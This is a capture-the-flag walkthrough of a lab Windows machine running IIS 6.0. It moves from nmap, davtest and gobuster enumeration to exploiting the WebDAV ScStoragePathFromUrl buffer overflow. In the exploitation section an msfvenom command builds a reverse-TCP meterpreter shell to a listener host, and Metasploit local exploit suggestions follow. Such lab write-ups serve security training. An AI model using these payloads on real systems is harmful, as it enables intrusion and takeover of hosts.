## Nmap Port Scanning
- <mark>Basic Scan </mark>
```bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap -Pn -sV -T4 10.10.10.14 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-11 13:07 EDT
Nmap scan report for 10.10.10.14
Host is up (0.024s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.77 seconds
```
- <mark>More Specific Scan Targeting Port 80</mark>
```bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap -Pn -sV -sC -T4 10.10.10.14 -p 80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-11 13:10 EDT
Nmap scan report for 10.10.10.14
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Mon, 11 Sep 2023 17:10:16 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.57 seconds
```
#### 80/tcp open Microsoft IIS httpd 6.0
- According to nmap scan, the webserver has potentially WebDAV enabled. Let's run davtest to confirm what file extension is allowed to be uploaded.
	```bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ davtest --url http://10.10.10.14 -cleanup
	********************************************************
	 Testing DAV connection
	OPEN            SUCCEED:                http://10.10.10.14
	********************************************************
	NOTE    Random string for this session: y6IivO
	********************************************************
	 Creating directory
	MKCOL           FAIL
	********************************************************
	 Sending test files
	PUT     cgi     FAIL
	PUT     html    FAIL
	PUT     txt     FAIL
	PUT     jsp     FAIL
	PUT     aspx    FAIL
	PUT     shtml   FAIL
	PUT     cfm     FAIL
	PUT     pl      FAIL
	PUT     php     FAIL
	PUT     asp     FAIL
	PUT     jhtml   FAIL
	********************************************************
	 Cleaning up
	
	********************************************************
	/usr/bin/davtest Summary:
	```
	- Unfortunately, it seems that nothing is enabled.
- <mark>Directory Brute-Forcing</mark>
	```bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ gobuster dir -u http://10.10.10.14 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
		=============================================================== 
		Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) 
		=============================================================== 
		[+] Url: http://10.10.10.14 
		[+] Threads: 10 
		[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
		[+] Status codes: 200,204,301,302,307,401,403 
		[+] User Agent: gobuster/3.0.1 
		[+] Timeout: 10s 
		=============================================================== 
		2020/05/27 16:01:06 Starting gobuster 
		=============================================================== 
		/images (Status: 301) 
		/_private (Status: 403) 
		===============================================================
		2020/05/27 16:03:19 Finished 
		===============================================================
	```
	- Unfortunately, directory brute-forcing also reveals nothing interesting.
- Since Microsoft IIS httpd 6.0 is old, we should check whether there is any inherent vulnerability to the web server itself.
	```bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ searchsploit iis 6.0
		Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow| windows/remote/41738.py
	```
	- `searchsploit` reveals one exploit that can be of potential entry-point. However, the above python code is a mere PoC and has a strict condition to work. However, with a little bit more research, one can find another script at `https://github.com/danigargu/explodingcan` that works given any proper shell code.
	- It turns out one has to figure out the IIS path length by brute-forcing for the buffer overflow to work and the PoC from `searchsploit` has hard-coded length.
- <mark>Exploitation</mark>
	- Set up listener with `msfconsole` and run the script to receive a meterpreter shell.
	```bash
	# According to the README of the script, the shellcode must be in alphanumeric format due to the limitations of the bug. One can use `msfvenom` (metasploit) with the `alpha_mixed` encoder.
	# payload generation
	msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.14.16 LPORT=4444 > shellcode
	# Exploitation
	python2 explodingcan.py http://10.10.10.14 shellcode
	```
- <mark>Post-Exploitation</mark>
```bash
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 184 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41

# Escalation  
exploit/windows/local/ms10_015_kitrap0d
```